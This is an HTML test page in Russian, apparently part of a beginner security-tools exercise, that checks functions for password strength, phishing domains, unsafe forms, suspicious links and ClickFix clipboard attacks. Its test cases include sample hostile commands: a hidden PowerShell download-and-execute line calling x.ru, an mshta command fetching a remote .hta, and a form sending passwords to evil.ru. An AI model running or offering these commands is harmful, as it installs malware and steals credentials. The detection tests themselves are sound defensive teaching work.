<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>Проверка твоих функций</title>
<style>
  body { font: 15px/1.5 -apple-system, sans-serif; background: #0f1020; color: #f4f4fb; max-width: 720px; margin: 32px auto; padding: 0 16px; }
  h1 { font-size: 22px; } h2 { font-size: 17px; margin-top: 28px; color: #c4b5fd; }
  .row { padding: 6px 10px; border-radius: 8px; margin: 4px 0; background: #1a1b33; }
  .pass::before { content: "✅ "; } .fail::before { content: "❌ "; }
  .fail { color: #fca5a5; } code { color: #f9a8d4; }
  .score { font-size: 18px; font-weight: 700; margin-top: 24px; }
</style>
</head>
<body>
<h1>🧪 Проверка твоих функций</h1>
<p>Открой этот файл в браузере после каждого изменения (или обнови страницу). Цель: все галочки зелёные.</p>
<div id="out"></div>
<script src="i18n.js"></script>
<script>LANG = "ru";</script>
<script src="strength.js"></script>
<script src="words.js"></script>
<script src="generator.js"></script>
<script src="sitecheck.js"></script>
<script src="score.js"></script>
<script>
const out = document.getElementById("out");
let passed = 0, total = 0;
function section(title) { out.insertAdjacentHTML("beforeend", `<h2>${title}</h2>`); }
function test(name, fn) {
  total++;
  let ok = false, note = "";
  try { ok = fn(); } catch (e) { note = ` (ошибка: ${e.message})`; }
  if (ok) passed++;
  out.insertAdjacentHTML("beforeend", `<div class="row ${ok ? "pass" : "fail"}">${name}${note}</div>`);
}
const weak = p => checkStrength(p).length > 0;
const strong = p => checkStrength(p).length === 0;

section("checkStrength — слабые пароли должны получать советы");
for (const p of ["abc", "qwerty123456", "password2010", "123456789012", "aaaaaaaaaaaa", "Йцукен123456", "15052010Anna"]) {
  test(`<code>${p}</code> — слабый`, () => weak(p));
}
section("checkStrength — сильные пароли без советов");
for (const p of ["Tr0ub4dor&3-horse!", "k9#Vm!2pQx@Lw7z", "Owl-Flies-At-7am!"]) {
  test(`<code>${p}</code> — сильный`, () => strong(p));
}

section("generatePassword");
test("возвращает строку нужной длины (16)", () => generatePassword(16).length === 16);
test("возвращает строку нужной длины (24)", () => generatePassword(24).length === 24);
test("каждый раз новый пароль", () => generatePassword(16) !== generatePassword(16));
test("бонус: есть цифра, заглавная и спецсимвол", () => {
  for (let i = 0; i < 50; i++) {
    const p = generatePassword(12);
    if (!/\d/.test(p) || !/[A-Z]/.test(p) || !/[^A-Za-z0-9]/.test(p)) return false;
  }
  return true;
});
test("бонус: сгенерированный пароль проходит твою же checkStrength", () => strong(generatePassword(16)));

section("generatePassphrase");
test("4 слова + число и символ", () => /^([A-Z][a-z]+-){4}\d\d[^A-Za-z0-9]$/.test(generatePassphrase(4, "ru")));
test("английские слова тоже работают", () => /^([A-Z][a-z]+-){5}\d\d[^A-Za-z0-9]$/.test(generatePassphrase(5, "en")));
test("пароль из слов проходит checkStrength (100 попыток, ru и en)", () => {
  for (let i = 0; i < 100; i++) {
    if (!strong(generatePassphrase(3, "ru")) || !strong(generatePassphrase(3, "en"))) return false;
  }
  return true;
});

section("checkSite — поддельные сайты");
const keys = h => checkSite(h).map(w => w.key).join(",");
for (const h of ["accounts.google.com", "github.com", "google.de", "mail.ru", "wikipedia.org", "steamcommunity.com"]) {
  test(`<code>${h}</code> — настоящий`, () => keys(h) === "");
}
for (const h of ["g00gle.com", "paypa1.com", "rnicrosoft.com", "gtihub.com", "instagrarn.com", "gosusIugi.ru"]) {
  test(`<code>${h}</code> — подделка`, () => keys(h) === "siteFake");
}
test("<code>paypal.com.secure-login.xyz</code> — похожий адрес", () => keys("paypal.com.secure-login.xyz") === "siteSimilar");
test("<code>xn--pple-43d.com</code> — буквы из другого алфавита", () => keys("xn--pple-43d.com").includes("sitePunycode"));
test("<code>192.168.1.1</code> — цифровой адрес", () => keys("192.168.1.1") === "siteIp");

section("checkForm — опасные формы");
const fkeys = (p, a) => checkForm(p, a).map(w => w.key).join(",");
test("страница http — опасно", () => fkeys("http://shop.com/login", null) === "formHttp");
test("форма шлёт пароль по http — опасно", () => fkeys("https://shop.com/login", "http://shop.com/auth") === "formActionHttp");
test("форма шлёт пароль на чужой сайт", () => fkeys("https://shop.com/login", "https://evil.ru/steal") === "formOther");
test("обычная форма https — всё хорошо", () => fkeys("https://www.shop.com/login", "/auth") === "");

section("checkLink — проверка ссылок");
const lkeys = u => checkLink(u).map(w => w.key).join(",");
test("<code>https://github.com/geo777arm</code> — без замечаний", () => lkeys("https://github.com/geo777arm") === "");
test("<code>https://google.com@evil.ru/login</code> — обман с @", () => lkeys("https://google.com@evil.ru/login").startsWith("linkAt"));
test("<code>https://bit.ly/3abc</code> — сокращённая ссылка", () => lkeys("https://bit.ly/3abc") === "linkShort");
test("<code>http://paypa1.com</code> — подделка и без https", () => lkeys("http://paypa1.com") === "siteFake,linkHttp");
test("<code>https://free-gift.xyz</code> — подозрительный домен", () => lkeys("https://free-gift.xyz") === "linkTld");
test("<code>javascript:alert(1)</code> — код вместо ссылки", () => lkeys("javascript:alert(1)") === "linkScript");

section("securityScore — балл защиты");
const S = (o) => securityScore(Object.assign({ stats: { checked: 0, leaked: 0, reused: 0 }, twofaSites: [], twofaDone: [], traceIds: ["a", "b"], traceDone: [] }, o));
test("новичок: 35 баллов и совет проверить пароль", () => { const r = S({}); return r.score === 35 && r.next.key === "nextCheck"; });
test("всё сделано: 100 баллов", () => S({ stats: { checked: 5, leaked: 0, reused: 0 }, twofaSites: ["google.com"], twofaDone: ["google.com"], traceDone: ["a", "b"] }).score === 100);
test("утечки снижают балл", () => S({ stats: { checked: 4, leaked: 2, reused: 0 } }).score < S({ stats: { checked: 4, leaked: 0, reused: 0 } }).score);
test("советует включить 2FA, если это даёт больше всего", () => { const r = S({ stats: { checked: 5, leaked: 0, reused: 0 }, twofaSites: ["google.com"], traceDone: ["a", "b"] }); return r.next.key === "nextTwofa" && r.next.args[0] === "google.com"; });

section("checkClipboard — вредные команды (ClickFix)");
test("обычный текст — ничего", () => checkClipboard("Привет, вот ссылка на домашку") === null);
test("powershell с «I am not a robot» — опасно", () => checkClipboard('powershell -w hidden -c "iwr http://x.ru/a.ps1 | iex" # I am not a robot - reCAPTCHA ID 4821') === "bad");
test("mshta + страница «нажмите Win+R» — опасно", () => checkClipboard("mshta https://evil.top/v.hta", "Verify you are human. Press Windows + R and paste") === "bad");
test("curl | bash на странице с инструкцией — просто предупреждение", () => checkClipboard('/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" | bash', "Paste that in a macOS Terminal prompt.") === "warn");

section("checkBait — развод с робуксами и скинами");
test("«Бесплатные робуксы» — развод", () => checkBait("robux-free.ru", "Получи бесплатные робуксы прямо сейчас! Войди в аккаунт") !== null);
test("«Free Robux generator» — развод", () => checkBait("rbx-gen.xyz", "Free Robux generator 2026") !== null);
test("roblox.com сам по себе — не развод", () => checkBait("www.roblox.com", "Buy Robux. You won a badge!") === null);
test("обычная страница — не развод", () => checkBait("school.ru", "Расписание уроков на неделю") === null);

out.insertAdjacentHTML("beforeend", `<p class="score">Пройдено: ${passed} из ${total}</p>`);
</script>
</body>
</html>
